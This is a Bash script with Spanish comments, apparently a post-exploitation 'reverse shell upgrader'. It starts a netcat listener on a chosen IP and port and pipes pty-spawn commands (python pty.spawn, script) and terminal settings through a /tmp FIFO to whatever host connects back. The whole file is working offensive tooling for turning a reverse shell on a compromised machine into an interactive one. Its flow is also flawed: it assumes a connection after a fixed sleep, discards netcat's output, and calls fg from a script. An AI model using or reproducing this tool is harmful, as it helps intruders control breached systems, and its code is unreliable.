#!/usr/bin/env bash

# Ultimate Reverse Shell Upgrader (v2.0) - Modificado sin log
# Features:
# - Parámetros interactivos si no se especifican
# - Orden IP primero, puerto después
# - Validación de entrada robusta
# - Eliminado el log a archivo

set -eo pipefail
IFS=$'\n\t'

# Configuración por defecto
DEFAULT_IP="0.0.0.0"
DEFAULT_PORT="4444"
TIMEOUT=15
NC_CMD=""

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Función para mostrar ayuda
show_help() {
    echo -e "${BLUE}Uso:${NC}"
    echo "  $0 [IP] [PUERTO]"
    echo "  $0 (sin parámetros para modo interactivo)"
    echo -e "\n${BLUE}Ejemplos:${NC}"
    echo "  $0 192.168.1.10 4444"
    echo "  $0 ::1 8080"
    echo "  $0 (modo interactivo)"
    exit 0
}

# Función de limpieza
cleanup() {
    echo -e "\n${YELLOW}[*] Limpiando...${NC}"
    [[ -p "/tmp/input" ]] && rm -f /tmp/input
    [[ -n $NC_PID ]] && kill -9 $NC_PID 2>/dev/null
    stty sane
    exit 0
}

# Validación de IP
validate_ip() {
    local ip=$1
    local stat=1

    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        IFS='.' read -r -a octets <<< "$ip"
        [[ ${octets[0]} -le 255 && ${octets[1]} -le 255 && \
           ${octets[2]} -le 255 && ${octets[3]} -le 255 ]]
        stat=$?
    elif [[ $ip =~ ^[0-9a-fA-F:]+$ ]]; then # IPv6
        stat=0
    elif [[ $ip == "localhost" ]]; then
        stat=0
    fi
    
    return $stat
}

# Validación de puerto
validate_port() {
    local port=$1
    [[ $port =~ ^[0-9]+$ ]] && ((port >= 1 && port <= 65535))
    return $?
}

# Preguntas interactivas
ask_parameters() {
    echo -e "${BLUE}[*] Modo interactivo${NC}"
    
    while :; do
        read -p "Introduce IP [${DEFAULT_IP}]: " ip
        ip=${ip:-$DEFAULT_IP}
        if validate_ip "$ip"; then
            break
        else
            echo -e "${RED}[!] IP no válida${NC}"
        fi
    done
    
    while :; do
        read -p "Introduce puerto [${DEFAULT_PORT}]: " port
        port=${port:-$DEFAULT_PORT}
        if validate_port "$port"; then
            break
        else
            echo -e "${RED}[!] Puerto no válido (1-65535)${NC}"
        fi
    done
    
    LISTEN_IP=$ip
    PORT=$port
}

# Verificación de dependencias
check_deps() {
    local missing=()
    
    # Detectar netcat
    if command -v nc &>/dev/null; then
        NC_CMD="nc"
    elif command -v netcat &>/dev/null; then
        NC_CMD="netcat"
    else
        missing+=("netcat")
    fi
    
    # Otras dependencias
    local commands=("bash" "stty" "ps" "mkfifo")
    for cmd in "${commands[@]}"; do
        if ! command -v $cmd &>/dev/null; then
            missing+=("$cmd")
        fi
    done
    
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${RED}[!] Faltan dependencias: ${missing[*]}${NC}"
        echo -e "${YELLOW}[*] Instala con: sudo apt install ${missing[*]}${NC}"
        exit 1
    fi
}

# Mejorar la shell
upgrade_shell() {
    {
        # Intentar con Python 3, Python 2, o script como fallback
        echo "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || script -qc /bin/bash /dev/null 2>/dev/null"
        sleep 1
        
        # Configurar terminal
        echo "stty rows $(tput lines) cols $(tput cols) 2>/dev/null"
        echo "export TERM=xterm-256color"
        echo "alias ls='ls --color=auto' 2>/dev/null"
        echo "reset 2>/dev/null"
        printf "\n"
    } > /tmp/input
}

# Main
trap cleanup SIGINT SIGTERM

# Procesar argumentos
if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    show_help
fi

if [[ $# -eq 2 ]]; then
    if validate_ip "$1" && validate_port "$2"; then
        LISTEN_IP=$1
        PORT=$2
    else
        echo -e "${RED}[!] Argumentos no válidos${NC}"
        show_help
    fi
elif [[ $# -eq 0 ]]; then
    ask_parameters
else
    echo -e "${RED}[!] Número de argumentos incorrecto${NC}"
    show_help
fi

check_deps

# Crear FIFO
if ! mkfifo /tmp/input 2>/dev/null; then
    echo -e "${RED}[!] Error al crear FIFO en /tmp/input${NC}"
    echo -e "${YELLOW}[*] Intenta eliminar manualmente: rm -f /tmp/input${NC}"
    exit 1
fi

# Configurar netcat
echo -e "${GREEN}[*] Iniciando listener en ${LISTEN_IP}:${PORT}${NC}"
echo -e "${YELLOW}[*] Usa Ctrl+C para salir${NC}"

# Detectar argumentos correctos para netcat
case $($NC_CMD -h 2>&1) in
    *"OpenBSD"*|*"Debian"*)
        NC_ARGS="-lvnp $PORT -s $LISTEN_IP" ;;
    *)
        NC_ARGS="-l -v -n -p $PORT -s $LISTEN_IP" ;;
esac

# Lanzar netcat sin redirigir salida a un log
$NC_CMD $NC_ARGS < /tmp/input > /dev/null 2>&1 &
NC_PID=$!

# Timeout para verificar que netcat siga en ejecución
{
    sleep $TIMEOUT
    if ! ps -p $NC_PID > /dev/null; then
        echo -e "${RED}[!] Tiempo de espera agotado sin conexiones${NC}"
        cleanup
    fi
} &

# Esperar conexión mediante tiempo fijo (sin leer log)
echo -e "${YELLOW}[*] Esperando conexión (espera fija de 10 segundos)${NC}"
sleep 10

echo -e "${GREEN}[+] Asumiendo que la conexión fue establecida (o en espera activa)...${NC}"
echo -e "${YELLOW}[*] Mejorando shell...${NC}"

upgrade_shell

echo -e "${GREEN}[+] Shell mejorada con éxito!${NC}"
echo -e "${YELLOW}[*] Usa 'reset' si hay problemas de terminal al salir${NC}"

# Intentar pasar la sesión al primer plano, si es aplicable
if ! fg >/dev/null 2>&1; then
    echo -e "${RED}[!] Error al traer a primer plano${NC}"
    cleanup
fi

cleanup
